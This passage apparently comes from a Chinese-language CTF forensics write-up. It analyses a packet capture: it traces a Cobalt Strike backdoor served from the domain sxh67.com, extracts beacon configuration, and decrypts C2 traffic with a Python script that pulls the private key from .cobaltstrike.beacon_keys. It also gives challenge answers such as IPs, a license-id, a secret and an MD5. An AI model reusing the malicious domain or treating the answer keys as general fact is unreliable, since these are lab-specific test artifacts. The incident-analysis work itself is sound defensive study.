+:
+上传了
+/var/www/html/index.html
+:
+对比 2 个 html 文件, 发现一处连接被修改:
+06 分发恶意文件域名
+¶
+答案
+sxh67.com
+首先找到恶意文件. 在导出文件对象中查看 HTTP 协议传输的文件对象, 发现其中包含几个主机名为域名的文件传输:
+其中有一个来自
+sxh67.com
+的
+setup.exe
+比较可疑, 导出, 发现是 Cobalt Strike 的后门:
+07 被控(访问了被修改后的网站)主机 ip
+¶
+答案
+192.168.111.167
+过滤一下 host 为上述网址的流量包:
+08 攻击者的 license-id
+¶
+答案
+987654321
+在 HTTP 协议的文件对象导出中, 过滤上题中看到的服务端 IP 地址
+192.168.111.164
+, 可以看到读取 CS 客户端配置文件的请求:
+或者在 WireShark 中过滤
+http.request.uri matches "/....$"
+.
+或者
+dissect.cobaltstrike
+来自动提取 Beacon 文件:
+Bash
+beacon-pcap
+--extract-beacons
+.
+\l
+xb.pcapng
+关于 Cobalt Strike 的流量分析可以参考文章
+Cobalt Strike Analysis and Tutorial: CS Metadata Encryption and Decryption
+.
+导出该文件对象, 使用
+Didier Stevens - Cobalt Strike Tools
+中的
+1768.py
+分析:
+09 攻击者的秘密
+¶
+答案
+hahaha_114514
+要解密 CS 流量.
+接本部分第 05 题. 在通过
+views.php
+执行的操作中包含文件上传:
+第三个参数的值 Base64 解码(去掉前 2 位, 是无意义的随机值)之后看到上传路径
+/var/www/html/.cobaltstrike.beacon_keys
+:
+复制 16 进制串, 用 CyberChef 由 Hex 转为进制文件:
+这是 CS 生成的包含通信私钥/公钥的文件, 本质上是 Java 导出的对象, 参考
+Cobalt Strike: Using Known Private Keys To Decrypt Traffic – Part 1
+:
+关于
+.cobaltstrike.beacon_keys
+文件
+Public and private keys are stored in file
+.cobaltstrike.beacon_keys
+. These keys are generated when the Cobalt Strike team server software is used for the first time.
+公/私钥存储在
+.cobaltstrike.beacon_keys
+文件中. 这些密钥在 CS 服务器首次运行时生成.
+During our fingerprinting of Internet facing Cobalt Strike servers, we found public keys that are used by many different servers. This implies that they use the same private key, thus that their
+.cobaltstrike.beacon_keys
+file is shared.
+在对互联网中的 CS 服务器进行指纹识别时, 我们发现了一些用于不同 CS 服务器的公钥. 这意味着这些服务器使用相同的私钥, 因此它们使用相同的
+.cobaltstrike.beacon_keys
+文件.
+One possible explanation we verified: are there cracked versions of Cobalt Strike, used by malicious actors, that include a
+.cobaltstrike.beacon_keys
+? This file is not part of a legitimate Cobalt Strike package, as it is generated at first time use.
+一种可能性是: 会不会攻击者使用的破解版 CS 中包含了一个
+.cobaltstrike.beacon_keys
+文件? 该文件不是正版的 CS 软件包的一部分, 因为它应当在首次运行时才生成.
+通过 Python 的 javaobj 库获取其中存储的私钥, 并转换为 pem 格式的字符串:
+Python
+import
+base64
+import
+javaobj
+# pip install javaobj-py3
+key
+=
+javaobj
+.
+loads
+(
+open
+(
+".cobaltstrike.beacon_keys"
+,
+"rb"
+)
+.
+read
+())
+privkey_der
+=
+bytes
+(
+c
+&
+0xFF
+for
+c
+in
+key
+.
+array
+.
+value
+.
+privateKey
+.
+encoded
+)
+print
+(
+f
+"-----BEGIN RSA PRIVATE KEY-----
+\n
+{
+base64
+.
+encodebytes
+(
+privkey_der
+)
+.
+strip
+()
+.
+decode
+()
+}
+\n
+-----END RSA PRIVATE KEY-----"
+)
+将输出保存为 pem 格式的密钥文件. 使用 beacon-pcap 解密 CS 流量:
+Bash
+beacon-pcap
+-w
+c2.records.gz
+-p
+.
+\k
+ey.pem
+.
+\l
+xb.pcapng
+--beacon
+.
+\b
+eacon-jRj7.bin
+beacon-jRj7.bin
+文件的来源参考本部分第 8 题.
+注意
+直接通过
+pip
+安装的
+dissect.cobaltstrike
+包有些问题, 无法正常运行. 我对源码中的
+c2.py
+和
+pcap.py
+进行了一些修改.
+修改后的源码:
+dissect.cobaltstrike.7z
+在解密出的流量中可以看到:
+另外一种思路
+假设: 攻击者使用了泄露的 CS 服务端软件, 包含了预生成的 Beacon 文件.
+从 Beacon 文件提取公钥:
+Bash
+beacon-dump
+-t
+raw
+.
+\b
+eacon-jRj7.bin
+|
+grep
+PUBKEY
+接着使用 VirusTotal 的 Hunting 功能, 在 VT 的样本库中寻找匹配的密钥对. 不过 VT 的 Hunting 功能是 Premium 功能, 试用申请起来比较麻烦.
+10 被控主机运行的存储服务及其端口
+¶
+答案
+MiniIO Console, 9000
+追踪 http 流量之后可以看到在最后有一些访问
+/api/v1/buckets
+的请求, 像是在访问 OSS:
+可以看到响应的头中包含服务器信息
+Server: MinIO Console
+. 找到最早与 192.168.111.167:9000 通信的几个包, 可以看到服务首页的 HTML:
+服务名称就叫"MinIO Console".
+11 被控主机最终向远控主机发送心跳包时间间隔
+¶
+答案
+20 s
+参考第 8 题, 可以看到配置中有一项
+server, get-url
+:
+该 URL 就是 CS 客户端的心跳检测 API 地址. 在 WireShark 中过滤, 可以看到最初不太稳定, 访问间隔时间波动较大; 但稳定之后, 访问时间间隔大约为 20 秒:
+12 被控主机存储桶中文件 md5 值
+¶
+答案
+67eba0f9bbb309b4bd55e14e182edaa2
+接本部分第 10 题.
+过滤一下和 MiniIO 服务的 HTTP 流量, 可以看到从
+pic
+Bucket 中下载了
+POentestWindows.png
+文件:
+导出 HTTP 文件对象:
